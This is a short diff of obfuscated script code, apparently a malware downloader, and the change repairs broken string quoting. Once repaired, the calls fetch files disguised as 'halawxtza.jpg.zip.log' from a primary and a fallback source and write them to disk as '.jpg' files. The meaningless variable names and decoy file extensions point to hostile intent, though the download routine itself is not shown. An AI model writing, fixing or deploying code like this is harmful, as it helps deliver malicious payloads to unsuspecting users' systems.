@@ -206,9 +206,9 @@ irz593 = "142_T3SL4S_"
 
 	try
 	{
-	 cq854 = mrc430(ekw28+"halawxtza.jpg.zip.log,gd481+"\\halawxtza.jpg");
+	 cq854 = mrc430(ekw28+"halawxtza.jpg.zip.log",gd481+"\\halawxtza.jpg");
         if (cq854 == false) {	
-	     mrc430(ekw282+"halawxtza.jpg.zip.log,gd481+"\\halawxtza.jpg");
+	     mrc430(ekw282+"halawxtza.jpg.zip.log",gd481+"\\halawxtza.jpg");
 	    }
 	}
     catch (ex)
@@ -219,9 +219,9 @@ irz593 = "142_T3SL4S_"
 
 	try
 	{
-	 cq854 = mrc430(ekw28+"halawxtzb.jpg.zip.log,gd481+"\\halawxtzb.jpg");
+	 cq854 = mrc430(ekw28+"halawxtzb.jpg.zip.log",gd481+"\\halawxtzb.jpg");
         if (cq854 == false) {	
-	     mrc430(ekw282+"halawxtzb.jpg.zip.log,gd481+"\\halawxtzb.jpg");
+	     mrc430(ekw282+"halawxtzb.jpg.zip.log",gd481+"\\halawxtzb.jpg");
 	    }
 	}
     catch (ex)
